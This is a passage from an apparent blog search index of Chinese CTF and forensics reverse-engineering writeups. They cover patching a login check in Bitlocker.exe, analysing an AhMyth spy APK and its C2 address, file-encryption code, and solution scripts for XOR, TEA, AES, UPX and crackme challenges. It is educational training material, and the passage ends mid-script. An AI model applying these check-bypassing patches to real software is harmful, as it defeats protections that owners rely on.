","date":"2024-12-22","externalUrl":null,"permalink":"/writeups/dasctf2024_series_re/","section":"Writeups","summary":"reverse writeup of DASCTF2024 series","title":"DASCTF2024系列赛 Reverse","type":"writeups"},{"content":"","date":"2024-11-09","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"题目难度不大，毕竟是取证比赛，查查信息然后连蒙带猜也能做的差不多。\n赛后从逆向的角度，对涉及到的几个程序再深入分析一下。\n个人赛逆向部分 # exe # 在U盘中,你还发现了一个exe文件,但它被锁定,可能需要进行反编译以便进一步检查。参考David_USB_8GB.e01,使用x64dbg的字符串搜索(String Search)功能,在Bitlocker.exe中查找哪个字符串最有可能与显示的登录状态有关? 承上題,当找到控制登录成功的逻辑代码时,如何修改汇编代码来绕过检查,达到任意输入，都成功登录的效果? Bitlocker.exe的正确用户登录名称是? Bitlocker.exe的正确登录密码是? 当 Bitlocker.exe程序尝试显示登录结果（成功或失败）时,使用了哪一种途径来决定显示的消息? 决定能否解密 Bitlocker Key的字节的内存偏移量(Memory Offset)（相对于基址\u0026quot;bitlocker.exe\u0026quot;）是什么? 决定能否解密 Bitlocker Key的内存偏移量(Memory Offset)后,应该如何利用它来进行解密? 解密后的 Bitlocker Key 是? 从U盘镜像中提取出这个Bitlocker.exe，先用DIE查一下，无壳，但要留意是GUI程序。\n利用DIE自带的字符串功能也可以搜索到相关的字符串。（比IDA中的多了PE头、.text 节、.rsrc节的字符串）\n程序的入口点恰好是WinMain函数，IDA打开后看这个函数的反编译伪码，只有简单的几行，除去最后的消息处理，只调用了两个函数：\nsub_140001620：注册窗口类，这个窗口类在第二个函数中用于创建窗口。 sub_140001700：CreateWindowExA创建主窗口，保持update。 在窗口类的定义中可以发现回调函数v2.lpfnWndProc = sub_1400017C0，进入该函数分析\na2是uMsg参数，在windows.h中可以找到如下的宏定义。结合switch-case中的值可以推测功能\n#define WM_CREATE\t0x0001 #define WM_DESTROY\t0x0002 #define WM_COMMAND\t0x0111 主窗口创建时，产生WM_CREATE消息，调用sub_140001850创建一系列的子窗口句柄，体现为输入框，按钮等控件。退出主窗口时则产生WM_DESTROY消息。\n重点放在command消息，也就是点击按钮时会调用sub_140001AE0。查看这个函数，发现最后用MessageBoxA来输出login结果，合理推测是对输入的用户名和密码进行检查。\n伪码能直接看到两个字符串常量，分别对应Username和Password。代码部分类似memcmp逐个字符检查。\n结果最终保存到v9中，通过if判断登录是否成功。对应的汇编是test + jnz，可以patch成jz来绕过检查。\n后面sub_7FF7CB6F22A0函数还进行了hash，生成bitlocker key，通过MessageBox输出。但是如果直接运行的话输入正确只会显示Keep going那段话。在最后可以看到这段代码由硬编码的byte_7FF7CB6F808C常量控制跳转 (也就是题目中提到决定能否解密Bitlocker Key 的字节)，必须要patch修改一下才能输出。\n到这里已经梳理出程序的整个逻辑。由于程序会解密key，所以理想的做法就是两次patch来绕过拿key，和题目引导的整个流程一致，不太需要关心加解密的具体实现。否则可能还要分析加密的API及其参数来确定是何种加密方式。\n团体赛逆向部分 # 赛后检材直接删了，忘了把程序保存到本地。拿着当时的截图简单讲下思路吧\napk # 你现在査看Ben的笔记本电脑，并发现了APK文件。一般而言，APK的关键组成部分是什么？\n参考 Ben_Laptop.zip内的 Joshe Investment.apk，这个APK没有 classes.dex文件，而是有 smali文件，以下哪一个陈述是正确的？(A：这是一个經過反向工程製作的APK)\nBen使用了哪个工具包生成恶意APK以控制受害者的设备？\n确认哪个.xml文件被特别添加为主活动（activity_main）的布局文件？\n确认被指定为主活动层（activity main layer）.xml文件的公共ID？\n确认应用程序没有要求的权限？\nahmyth/mine/king/ahmyth/文件夹下的 b.smali文件的主要功能是什么？\n在 ahmyth/mine/king/ahmyth/文件夹下的 b.smali文件中，字节数组（Byte Array）在发送到服务器之前执行了哪一系列操作，最终的图像格式是？\n在 ahmyth/mine/king/ahmyth/文件夹下的 b.smali文件中，图像在发送到服务器時的压缩比率是多少？\n在 ahmyth/mine/king/ahmyth/文件夹下的 ConnectionManager.smali中，sendReqmethod的目的是什么？\n承上题，参考 Ben Laptop.zip内的 Joshe Investment.apk，C2服务器的IP地址及端口号？\nahmyth/mine/king/ahmyth/文件夹下的 g.smali文件中，MediaRecorder被初始化用于录音。如果 setAudioSource()方法使用了错误的参数，会发生什么，且这将如何影响录音过程的功能？\nahmyth/mine/king/ahmyth/文件夹下的 g.smali文件中，TimerTask用于在启动 MediaRecorder后调度动作。TimerTask在这个过程中有什么作用？\n在 ahmyth/mine/king/ahmyth/文件夹下的 h.smali文件中，method a()和method b()的主要功能有什么区别？\n在 ahmyth/mine/king/ahmyth/文件夹下的h.smali文件中，method b()需要哪些参数？\n在Ben的Laptop的镜像中，Joshe Investment.apk，jadx反编译后看到符号的混淆比较严重。\n查看ahmyth包，这个应该是远控工具，主活动和主服务也在这个包里面。\n在MainActivity中找SetContentView对应的layout，可以确定使用的布局xml文件，其id保存在R类中。\nAndroidManifest.xml可以查到要求的权限。\n接下来对apk的反编译代码进行分析。由于代码量较大且程序被误删掉，只浅析一下题目ahmyth/mine/king/ahmyth中提到的几个部分\nb.smali # onPictureTaken函数，推测与相机拍摄图像相关。先调用this.d释放camera实例，紧接着调用this.e(bArr)将字节数组解码成bitmap图像，再压缩成JEPG。压缩率是decodeByteArray.compress的第二个参数。整个JPEG图像以字节流写入json对象并发送。\nConnectionManager # 看到sendReq声明了一个b.a.b.e的实例对象，并用e.a().b()进行初始化。\n分别查看二者的代码实现，在b.a.b.e中发现“connect”等关键词，推测与某个服务器建立连接。之后分析e.a.b，找到一串Base64编码过的字符串，解码后即为C2服务器的ip和端口。\ng.smali # TimerTask\nh.smali # 逆向分析，发现sms\n分析sendTextMessage参数\n着重分析方法a和方法b\npython # 在分析Ben的笔记本电脑时，你从调查人员那里获得了以下信息：在对一名被捕的犯罪集团成员进行审问时获得的情报显示，Ben对John心怀怨恨，因为John扣留了Ben的犯罪收益份额。因此，Ben加密了John的机密文件夹，以限制他的访问。参考 Ben_Laptop.zip，解密 secretExcel.encrypted的第一步应该是什么？\n在加密文件 secretExcel.encrypted中，初始向量 （lnitial Vector）的值是什么？\n在加密文件 secretExcel.encrypted中，盐值（SALT）是什么？\n查看encrypt.py代码，如果更改 'PBKDF2'的 'count'参数会产生什么影响？\n根据分析及计算后，解密 secrectExcel.encrypted所用的key具体值是什么？\n同样在Ben的Laptop。这个和逆向关联可能不是很大，直接给了python源码，但是毕竟涉及到加解密。\n找到encrypt.py，源代码如下：\nimport os import sys from Crypto.Cipher import AES from Crypto.Protocol.KDF import PBKDF2 from Crypto.Random import get_random_bytes from Crypto.Util.Padding import pad def encrypt_file(file_path, password): salt = get_random_bytes(32) key = PBKDF2(password, salt, dkLen=32, count=100000000) file_path = os.path.abspath(file_path) output_dir = os.path.dirname(file_path) folder_name = os.path.splitext(os.path.basename(file_path))[O] encrypted_path = os.path.join(output_dir, f\u0026#34;{folder_name}.encrypted\u0026#34;) os.makedirs(os.path.dirname(encrypted_path), exist_ok=True) with open(file_path, \u0026#39;rb\u0026#39;) as f_in, open (encrypted_path, \u0026#39;wb\u0026#39;) as f_out: data f_in.read() cipher = AES.new(key,AES.MODE_CBC) f_out.write(cipher.iv) f_out.write(salt) encrypted_data = cipher.encrypt(pad(data,AES.block_size)) f_out.write(encrypted_data) print(f\u0026#34;File encrypted successfully: {encrypted path}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 3: print(\u0026#34;Usage: python encrypt.py \u0026lt;file_path\u0026gt; \u0026lt;password\u0026gt;\u0026#34;) sys.exit(1) file_path = sys.argv[1] password = sys.argv[2] encrypt_file(file_path, password) 先基于PBKDF2算法生成伪随机密钥。查看crypto库的文档可以了解到该算法各个参数的作用，count参数代表迭代的次数，影响计算性能和安全性。\n生成key之后进行AES-CBC加密。其中初始向量iv（16 bytes）和加盐salt（32 bytes）的值依次写入了加密文件的最前面。可以用十六进制编辑器提取出来。\n反解出key再解密AES，恢复被加密的excel文件。\n","date":"2024-11-09","externalUrl":null,"permalink":"/writeups/meiyacup2024/","section":"Writeups","summary":"some simple analysis","title":"第十届美亚杯 Reverse部分","type":"writeups"},{"content":" Week1 # SignSign # 打开程序，直接送上flag，但只输出了flag的后一半？？\n为了找到完整的flag，我们用ida打开程序，进行静态分析。\n正常情况下，一开始能看到一个写满汇编指令的窗口。这个就是程序对应主函数的反汇编结果。\n但是主函数中并没有另一半flag。\n这个时候我们的思路应该是去搜集一下这个程序的相关信息，尤其是字符串信息很重要。\n打开字符串窗口（快捷键Shift+F12），查看程序的所有字符串。\n能看到两段flag都在其中，拼接一下即可提交。\nBinaryMaster # 有两种思路:\n按照题目提示，八进制04242424转成十六进制为0x114514。把这个结果输入程序后拿到flag。 IDA反编译主函数，可以直接看到flag明文。 对于第二种思路：在反汇编结果页面，按F5（或者Tab）就可以生成反编译的伪C代码。这一功能大大降低了逆向分析的难度。反编译成功后，程序的主要逻辑就很清晰明白了。\nBabyBase # 按照上面两题的方法反编译程序主函数。\n发现调用了两个可能和flag相关的函数：encode() 和 check_flag()，后续要着重分析。\n如果继续收集信息，查看字符串，能够发现一个比较特殊的字符串：（下图蓝色高亮）\n有经验的师傅一眼就能看出是base64标准索引表，然后直接base64decode一把梭了。不过没看出也不要紧。\n按照常规思路，逆向分析上面提到的两个关键函数：\ncheck_flag：检查编码后的结果是否正确，其实就是给出了编码结果（在上面字符串窗口也能看到）\nencode：Base64编码的具体实现，如果要彻底看懂这个函数，最好提前了解一下Base64的原理。\n不过看到一些关键特征也能大概推测出来，比如3字节输入变成4字节输出、以及添加到末尾的等号。\n最后拿着结果找个在线网站解码就可以，非常推荐: CyberChef\nXor-Beginning # 反编译后，可以暂时忽略主函数中常见的IO函数和数据赋值等部分，以便快速找到核心逻辑。\n可以发现关键代码是下图的一段循环。涉及到运算符^，对应的运算是异或。\n异或（xor）是逆向中很常见的一种位运算，它的逆运算就是自身，也就是 (A ^ B) ^ B == A 由此推导出解密方法和加密方法相同。\n回到前面提取出赋值给数组 v5 的密文，可以写出如下解密脚本：\ndata=[0x7E, 0x35, 0x0B, 0x2A, 0x27, 0x2C, 0x33, 0x1F, 0x76, 0x37, 0x1B, 0x72, 0x31, 0x1E, 0x36, 0x0C, 0x4C, 0x44, 0x63, 0x72, 0x57, 0x49, 0x08, 0x45, 0x42, 0x01, 0x5A, 0x04, 0x13, 0x4C] for i in range(len(data)): data[i] = data[i]^(78-i) print(bytes(data).decode(\u0026#34;utf-8\u0026#34;)) Xor-Endian # c语言中int类型是32位数据，即4字节。\n由于数据在内存中以字节为单位存储，int类型也可以看作长度为4的char数组。\n多字节类型的数据，各个字节按照 小端序（Little Endian）存储，这一顺序与我们习惯的阅读顺序相反。\n本题的文件格式是ELF，也就是Linux下的可执行程序。\n可以在Linux系统下用 file 命令查一下：\nELF在Windows系统下不能直接运行，但并不妨碍用IDA进行静态分析。\n和上一题类似，程序同样使用了xor进行加密，但是密文是比较大的整数，有点奇怪。\n出题时这里其实是char数组强制类型转换成了int数组，每一个数字实际上对应着四个字符。\n在提取密文进行解密的时候，要把这些数字重新转换成字符串或者char数组。过程中一定注意小端序的处理，才能让最后得到的字符串顺序正确。例如下面python脚本使用的函数 to_bytes(4,\u0026quot;little\u0026quot;)\ndata = [1363025275,253370901,1448151638,1415391232,91507463,139743552, 1450318164,1985283101,1465125718,1934953223,84430593] source = b\u0026#39;\u0026#39;.join([element.to_bytes(4,\u0026#34;little\u0026#34;) for element in data]) key = b\u0026#39;Key0xGame2024\u0026#39; for i in range(len(source)): flag = chr(source[i] ^ key[i % len(key)]) print(flag,end=\u0026#34;\u0026#34;) 当然也可以巧妙利用IDA规避这一问题。IDA自动按照小端序解析字符串，但是注意伪代码中字符串用双引号标注，有的师傅遇到下图的情况：\n仔细观察能发现是用的单引号，这个应该理解为字节序列，依然按照大端的顺序从左到右解析的。\n这个时候按一下F5重新反编译就能看到正确顺序的字符串。最后解密思路和上面脚本相同。\nWeek2 # BabyUPX # 根据题目的提示，可以猜到本题加了UPX壳。UPX是一种常见的压缩壳，可以使用查壳工具进行检测。常用的有以下两种：\nExeinfo PE （Github：exeinfo） Detect-It-Easy （比较推荐，Github：DIE） 压缩壳对exe文件进行压缩，在执行原程序代码前率先取得控制权，自动对原始程序解压还原，以达到保护程序不被静态反编译的目的。如果直接把程序扔进IDA，就会看到警告和一个明显不正常的start函数，而我们想要的主函数是无法找到的。\n这里就要考虑如何脱壳。UPX能够压缩的同时自带解压功能，所以先去下载 UPX- the Ultimate Packer for eXecutables（命令行工具）。然后一把抓住程序，输入脱壳命令，顷刻炼化。\nupx -d \u0026lt;filename\u0026gt; 脱壳后能用IDA正常打开。分析encode函数，可以看出每个字节高4位和低4位交换，实际上就是16进制逆序。\nFirstSight-Pyc # .pyc是Python源代码经过编译生成的字节码文件。可以选择pycdc或者uncompyle6 进行反编译。\n要注意pyc文件对应的python版本可能会影响反编译的效果，本题使用的是较低的3.8版本，经过测试上述两个反编译引擎都能还原代码。\n以uncompyle6为例进行分析，反编译结果如下：\n加密逻辑是先对输入取md5得到十六进制摘要，之后仅对数字部分进行rot5，最后套上0xGame{}输出。\n直接运行pyc程序即可得到flag，但是需要用3.8版本的python解释器才能正常运行。\n当然也可以把反编译的代码copy下来运行。\nFirstSight-Jar # Java源文件编译后生成.class文件，之后打包成可执行的jar包。\n针对jar的反编译工具有很多，例如Procyon、CFR、jd、jadx等，一抓一大把，找一款适合的就可以。\n以jadx为例：\nencrypt实现了一个简单的仿射密码，只不过字母表改成了十六进制字符。\n加密函数的数学形式为 \\(E(x) = 5x+3(mod\\ 16)\\)，求解同余式就可以反解出x。注意解密时不能用除法，在模运算下要改用乘法逆元。\nimport gmpy2 Alphabat = \u0026#34;0123456789abcdef\u0026#34; enc = \u0026#34;ab50e920-4a97-70d1-b646-cdac5c873376\u0026#34; inverse = int(gmpy2.invert(5,16)) for i in enc: if i not in Alphabat: print(i,end=\u0026#34;\u0026#34;) else: index = ((Alphabat.index(i) - 3)*inverse)%16 print(Alphabat[index],end=\u0026#34;\u0026#34;) 另外值得一提，仿射密码作为单表代换密码，明文和密文之间存在一一映射关系。有不少师傅先计算出了明文字符与密文字符的对应关系，然后逐一替换来解密。这个思路也是可行的。\nXor::Random # c++程序，反编译后看起来有一点丑陋，涉及到大量使用的模板，类，对象，还有构造析构函数。\n函数名比较长，不过都是标准库的函数，不难根据名字推测函数功能。\n主函数大概可以划分成三部分：先检查了flag的格式和长度，之后生成随机数v21，最后一边用v21异或加密一边检查。注意密钥从v21和v21+3中交替选择。\n重点说一下中间随机数的部分。有两种解法：\n解法一：常规静态分析 结合密码学的相关知识，可以知道种子能够控制伪随机数生成。程序首先在init_random函数中设置了种子0x77。后面if语句中又设置了种子0x1919810。到底用了哪个种子呢？\n回过头跟踪v6的赋值，查看check()，不难发现这个函数的返回值一定为0，那么v6的值也为0。上图绿色方框内的srand()压根不会执行。由此可以确定正确的种子，进而得到正确的随机数值。等效的简化代码如下：\nsrand(0x77); v22 = rand(); v21 = rand(); 不同编程语言的伪随机数生成算法存在差异，甚至c标准库在windows和linux系统下的rand实现也不一样。本题的随机数应在windows下调用stdlib.h的rand。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { unsigned char num,key; unsigned char *array; unsigned long long v13[4]; v13[0] = 0x1221164E1F104F0C; v13[1] = 0x171F240A4B10244B; v13[2] = 0x1A2C5C2108074F09; v13[3] = 99338668810000; srand(0x77); rand(); num = rand() \u0026amp; 0xff; array = (unsigned char*)v13; for(int i = 0; i \u0026lt;= 29; i++) { key = (i % 2 !=0? num: num+3); array[i] ^= key; } printf(\u0026#34;0xGame{%s}\u0026#34;,array); return 0; } 解法二：动态调试直接拿密钥 由于check()只检查长度不检查内容，而且随机数种子只可能二选一，所以直接在v21最后一次赋值处设置断点。当程序运行到此处时种子一定已经被确定下来，不用关心到底用了哪个种子，我们只需要拿v21这个随机数的具体值即可。\n调试可以选择IDA自带的Local Windows debugger调试器，断点处的语句运行后，查看内存中的随机数值。\n脚本参考解法一。\nZzZ # 本题是Visual Studio 2022生成的Debug程序，vs生成程序的一大特征就是把函数名、变量名等符号全部拿出来放到pdb文件中。如果没有符号文件，在静态分析时就看不到这些信息。\n无符号的情况下，IDA会自动把函数命名为其起始地址。start代表是整个程序的入口点，与main略有区别。\n首先要想办法找到main()。不难发现程序运行时会输出enter flag的提示，而main()一定会调用io函数来输出这一字符串。所以可以从字符串入手，通过字符串窗口找到相关的字符串，进行交叉引用，定位到主函数。\n交叉引用快捷键：X 或 ctrl+X\n之后就成功来到了主函数，反编译后分析加密逻辑：\nflag内的uuid共有5段，其中首尾两段直接给出，中间三段从字符数组转unsinged int后代入方程组验证。\n接下来用Z3 Solver解方程，因为涉及位运算，所以用BitVec这种类型，长度至少为32bit。\n有的师傅在解出方程后发现结果有问题，基本上都是在数据类型上出了问题。举例来说：%4s向(const char *)v5这个地址写入连续的4个字节，但v5本身是unsigned int数组，所以这4个字节会被按小端序解析成数组的第一个unsigned int元素，之后赋值给v10进行方程的运算。\n所以解出来的值应该是一个4字节也就是32bit的整数，之后按小端转成字节再转字符串。\nfrom z3 import * v13 = 3846448765 v14 = 0xD085A85201A4 v10,v11,v12 = BitVecs(\u0026#34;v10 v11 v12\u0026#34;,32) s = Solver() s.add(11 * v11 + 14 * v10 - v12 == 0x48FB41DDD) s.add(9 * v10 - 3 * v11 + 4 * v12 == 0x2BA692AD7) s.add(((v12 - v11) \u0026gt;\u0026gt; 1) + (v10 ^ 0x87654321) == 3451779756) if s.check()==sat: result = s.model() form = \u0026#34;0xGame{%8x-%4s-%4s-%4s-%12x}\u0026#34; args = [result[var].as_long().to_bytes(4,\u0026#34;little\u0026#34;).decode() for var in (v10,v11,v12)] print(form % (v13,args[0],args[1],args[2],v14)) Week3 # BabyASM # 一段比较精简的Intel x86汇编指令，除去数据之外大概50多行，主要考察一些常见汇编指令的功能。\n同时也是提醒下不要太过于依赖IDA反编译的伪码，F5虽好但也可能出现反编译错误甚至完全用不了的情况，所以还是有必要掌握汇编的知识。\njle向回跳转表示循环，程序的两段循环分别在L4和L5部分，对应两段加密。\ndata = [20, 92, 43, 69, 81, 73, 95, 23, 72, 22, 24, 69, 25, 27, 22, 17, 23, 29, 24, 73, 17, 24, 85, 27, 112, 76, 15, 92, 24, 1, 73, 84, 13, 81, 12, 0, 84, 73, 82, 8, 82, 81, 76, 125] for i in range(22): data[i] += 28 for j in range(22,43,1): data[j] ^= data[j-22] print(bytes(data).decode()) 非预期：把文件.txt改成.s后缀，用Linux直接gcc编译链接成32位程序，运行出flag\nLittlePuzzle # 和上周差不多的java逆向。反编译后看到一个 \\(9\\times 9\\) 的二维数组board，之后分析下面的check函数可以确定是数独的逻辑。把board提取出来整理成数独的格式，如下图：\n数独本身难度不大，可以自行推理求解，也可以找数独求解器一类的工具去解。\n最后应该能求出唯一的一个解（下图白色部分）\n通过主函数的代码，能够分析出只需要输入（白色部分的）解即可，程序调用flag函数输出flag。\nTea # 程序没有符号信息，但是结合上一周的经验，可以通过字符串来定位主函数。\n代码量并不多，比较难受的是不能根据函数名推测功能，有耐心的话挨个函数点进去看也是可以的。\n好一点的方法是，关注对明文（传入的flag）和密文进行操作的函数，从这些函数入手分析。\n传入的明文是Buf1,根据memcmp推测绿色框中的数据是密文，中间for循环调用的可以猜到是加密函数，红色框的数据对应密钥。\n细心观察可以发现密文被用了两次，除去最后的check，前面还有一次对密文进行了逆序(sub_1400113B6)\n接下来分析加密函数，是经典的TEA加密算法，题目中也有提示。算法的具体原理可以自行搜索了解(这里贴一个b站视频【动画密码学】TEA )， 一个很显著的识别特征是0x9E3779B9，也就是题目中的v5 -= 0x61C88647\n最后有个小坑还需要说一下，Buf1是unsigned int数组而不是char数组，每两次加密的数据间隔了8*4 = 0x20字节。实际上只加密了flag的最前面8个字节和最后面8个字节。中间的部分没有变化，能够看出来还是可读的十六进制明文。解密只需调用两次tea解密。\n（至于为什么for循环中j\u0026lt;5进行了5次加密，其实算是一个干扰项。但是Buf1数组开的空间不够大，导致加密时会越界把栈上的一些无关数据也加密了，可能影响到一些师傅的分析思路，在这里给各位师傅们磕一个）\n#include\u0026lt;stdio.h\u0026gt; void tea_decry(unsigned int data[2], unsigned int key[4]) { unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x9e3779b9, number = delta * 32; for (int i = 0; i \u0026lt; 32; i++) { d2 -= ((d1\u0026lt;\u0026lt;4) + key[2]) ^ ((d1\u0026gt;\u0026gt;5) + key[3]) ^ (d1 + number); d1 -= ((d2\u0026lt;\u0026lt;4) + key[0]) ^ ((d2\u0026gt;\u0026gt;5) + key[1]) ^ (d2 + number); number -= delta; } data[0] = d1; data[1] = d2; } void reverse(unsigned char *data,unsigned int len) { unsigned char *pchar = data; unsigned char *bchar = data + len - 1; unsigned char bufchar; while(pchar\u0026lt;bchar) { bufchar = *pchar; *pchar = *bchar; *bchar = bufchar; pchar++; bchar--; } } int main() { unsigned char data[] = { 0xC9, 0xB6, 0x5C, 0xCE, 0xF8, 0xEE, 0x8E, 0xA2, 0x33, 0x36, 0x34, 0x63, 0x37, 0x32, 0x36, 0x64, 0x38, 0x37, 0x65, 0x33, 0x62, 0x33, 0x63, 0x64, 0x36, 0x39, 0x64, 0x34, 0x64, 0x30, 0x62, 0x38, 0x2A, 0x7A, 0x7C, 0x3B, 0x85, 0x33, 0x6D, 0xD3}; reverse(data,40); unsigned int key[] = {2,0,2,4}; unsigned int *u32data = (unsigned int*)data； tea_decry(\u0026amp;u32data, key); tea_decry(\u0026amp;u32data[8], key); printf(\u0026#34;%s\u0026#34;,data); return 0; } The Matrix # 本题的矩阵使用了结构体进行存储，由于IDA不能识别自定义的结构体，所以会看到有大量形式相似的赋值语句，其实是结构体元素的初始化。 由于内存对齐的原则，结构体大小为0x10字节，其中element_array的指针占用最后8字节。\nstruct Matrix_m_n{ unsigned char m unsigned char n, unsigned int* element_array } 程序混淆了几个关键的函数名，不过好在大多数函数的名称是正常的，只需要对这几个函数单独分析即可。\n调用了4次hello(data,Matrix)初始化4个key矩阵元素的值。要留意一下这几个key在栈上的顺序，后面加密时会用到。\nMorpheus(Matrix,length,flag)检查输入flag长度，之后初始化矩阵元素。\n之后分析下面的加密逻辑，guess(keyMatrix,sourceMatrix,outputMatrix)实现矩阵乘法，也就是key矩阵右乘flag明文的矩阵。\n根据线性代数知识，\\(KA =B\\) 这一矩阵方程的解为 \\(A = K^{-1}B\\)\n利用numpy可以比较方便的求出逆矩阵(但是求出来的有点精度误差，需要手动修正下，题目给的key矩阵求逆后元素依然都是整数，所以四舍五入一下)，进而还原加密前的矩阵，得到flag。\nimport numpy as np k1=[1,3,1,0,2,1,1,2,0] k2=[1,2,2,3,5,6,0,2,1] k3=[0,4,3,1,2,1,2,3,1] k4=[1,2,3,3,5,6,1,4,10] data = [ 0x1e8,0x1c0,0x181,0x557,0x4d3,0x41e,0x13d,0x111,0x102, 0x26c,0x140,0x145,0x5b7,0x2ec,0x2f3,0x5e9,0x31d,0x336, 0x14d,0x10a,0x192,0xbd,0x9f,0xf5,0xbd,0xa1,0x101, 0x162,0x147,0x223,0xfb,0xc0,0x126,0x191,0x123,0x1b7, 0xf0,0xfd,0x10d,0x29e,0x2c0,0x2f1,0x91,0x9f,0xa4, 0x229,0x13b,0x12e,0x4e4,0x2d8,0x2c7,0x5bd,0x325,0x2e4, 0x1c7,0x151,0xd5,0xfe,0xe5,0x6e,0x12c,0xa0,0x9e] # 注意key矩阵的顺序 keyMat = [np.array(var).reshape(3,3) for var in (k2,k4,k1,k3)] dataMat = [np.array(data[i*9:(i+1)*9]).reshape(3,3) for i in range(len(data)//9)] flag = [] for i in range(7): inv = np.linalg.inv(keyMat[i%4]) arr = np.matmul(inv,dataMat[i]).flatten().tolist() if i \u0026lt; 6: arr = arr[:6] # 相邻矩阵的元素重叠 flag.extend([round(num) for num in arr]) print(bytes(flag).decode()) FirstSight-Android (Mobile) # 安卓apk反编译，比较好用的工具是GDA和jadx，更推荐后者。\n程序位置在com.example.ezandroid，不难发现有一个Base62编码类，主活动调用了其中的编码函数，然后和secret字符串进行比较。\nAndroid程序的各种资源都被保存到xml文件中，字符串也不例外，所以secret字符串的具体内容要去value/string.xml查看。可以在jadx中搜索资源中的文本。\n之后拿去解码即可。\nWeek4 # PyPro # 根据题目提示推测本题的程序由python打包而来，先 pyinstaller 解包（这一步也可以参考后面Misc）\n解包结果可以看到pyc版本：3.12，很不幸 uncompyle6 不支持反编译3.9版本以上的 pyc，这里可以用 pycdc。( https://github.com/zrax/pycdc，官方版本是源代码，需要手动cmake一下，pycdc可能遇到反编译了一半之后报错罢工的情况，参照 Issue #307 改一下pycdc源码之后重新编译即可解决，当然也可以用pycdas看字节码）\nPyLingual这个网站也支持反编译3.12版本，效果还不错。\n贴个源码：\nimport base64 from Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes key = 0x554b134a029de539438bd18604bf114 def PKCS5_pad(data): if len(data)\u0026lt;48: length = 48 - len(data) return data.ljust(48,length.to_bytes()) else: return None def main(): enc = input(\u0026#34;在这里输入你的flag:\\n\u0026#34;).encode(\u0026#34;utf-8\u0026#34;) if len(enc)!=44: print(\u0026#34;length error!\u0026#34;) for i in range(len(enc)): exit(123) elif enc[6] != ord(\u0026#34;{\u0026#34;) or enc[-1] != ord(\u0026#34;}\u0026#34;): print(\u0026#34;format error\u0026#34;) exit(1) chiper = AES.new(long_to_bytes(key),AES.MODE_ECB) enc = chiper.encrypt(PKCS5_pad(enc)) result = base64.b64encode(enc) data = \u0026#39;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q\u0026#39; if result.decode() == data: print(\u0026#34;flag正确\u0026#34;) else: print(\u0026#34;错误\u0026#34;) return None if __name__ == \u0026#34;__main__\u0026#34;: main() 先AES之后Base64，解密就不难了。从反编译结果直接抄点代码下来，或者Cyberchef一把梭。\nimport base64 from Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes key = 0x554b134a029de539438bd18604bf114 data = \u0026#39;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q\u0026#39; enc = base64.b64decode(data) chiper = AES.new(long_to_bytes(key),AES.MODE_ECB) flag = chiper.decrypt(enc) print(flag) MineSweeper # Unity游戏题，选择C#反编译工具DnSpy或者ILSpy。一般情况下(没有IL2CPP)，游戏代码编译后保存在Assembly-CSharp.dll文件中，预期是对这个文件进行逆向。\n题目解法比较开放，有师傅直接硬扫70个雷通关的，但是难度太大不推荐硬玩。\n先说常规思路：静态分析\n找到Game类，分析Update函数，发现通关后会调用crypt函数解密出flag然后输出。 继续分析crypt，函数导入了Resources/enc.bytes的前44字节作为密文。这个文件用AssetStudio可以导出，之后用十六进制编辑器查看。 接下来的解密部分有点类似RC4，Game.key先打乱传入的参数Key也就是Game.haha，得到的结果作为真正的密钥进行异或。 仿照crypt函数搓个解密脚本。 更推荐的方法：patch修改游戏逻辑。DnSpy中可以编辑反编译的代码，只要想办法触发通关条件就能拿flag，修改后记得重新编译运行。\n最直接的改法，把开始时的雷数改成0，点两下就通关。或者this.gamewin直接改成true wincheck函数中修改语句win = true 改Update函数对this.gamewin的判断，对条件取反。 当然改法还有很多，甚至可以重写整个函数，在刚进入游戏的时候就弹出flag。\nRegister # 一个简易的crackme，需要逆向破解序列号保护。\n打开运行，发现要输入用户名和对应的序列号。用户名只能是题目描述中提到的0xGameUser，否则警告用户名错误，这也是为了避免多解。\n使用DIE进一步查信息，32位GUI\n运行时注意观察字符串信息，之后在IDA通过字符串定位关键函数\n如果交叉引用主窗口标题 “0xCrackMe”，定位到 WinMain，之后找回调函数 lpfnWndProc 交叉引用子窗口的相关字符串直接定位到回调函数 sub_411B10 在整个逆向过程中会碰到很多windows API函数，可以去Microsoft官方文档搜索查询。\n进入sub_4112DA继续分析，v9这里是对时间戳右移28位，结合动态调试也能发现v9是一个固定值。之后先对用户名异或，再调用sub_1011041生成SHA1哈希值。\nSHA1的十六进制值套上0xGame{}就是flag\nTea2.0 # 同样是32位程序，反编译后定位主函数。代码只有短短几行，逻辑还是比较清晰的。\nsub_41116D是加密函数，分析一下发现和上周的TEA很像，通过网络搜索或者问AI能够分析出是XTEA加密。不过要注意轮数改成了64轮。\n之后按常规思路就是拿unk_41A020密文进行解密，不出意外会得到一串乱码）\n第四周的题目当然不会白送分。为了找到问题出在哪里，借助动态调试对加密过程和密文密钥进行检查，最后发现密文和静态分析时看到的硬编码的数据不同。把这段新的密文dump下来拿去解密才会得到flag。\n如果纯静态做要麻烦的多。交叉引用unk_41A020，可以看到TlsCallback_1_0函数修改了密文（注意Tlscallback部分的代码先于主函数执行），具体原理是对硬编码的密文进行了一次TEA加密，其密钥又经过TlsCallback_0_0修改。理清这些后可以写出如下脚本：\n#include\u0026lt;stdio.h\u0026gt; void tea_encry(unsigned int* data, unsigned int* key) { unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x9e3779b9, sum = 0; for (int i = 0; i \u0026lt; 32; i++) { sum += delta; d1 += ((d2 \u0026lt;\u0026lt; 4) + key[0]) ^ ((d2 \u0026gt;\u0026gt; 5) + key[1]) ^ (d2 + sum); d2 += ((d1 \u0026lt;\u0026lt; 4) + key[2]) ^ ((d1 \u0026gt;\u0026gt; 5) + key[3]) ^ (d1 + sum); } data[0] = d1; data[1] = d2; } void xtea_decry(unsigned int *data, unsigned int *key) { int round = 64; unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x9e3779b9, number = delta 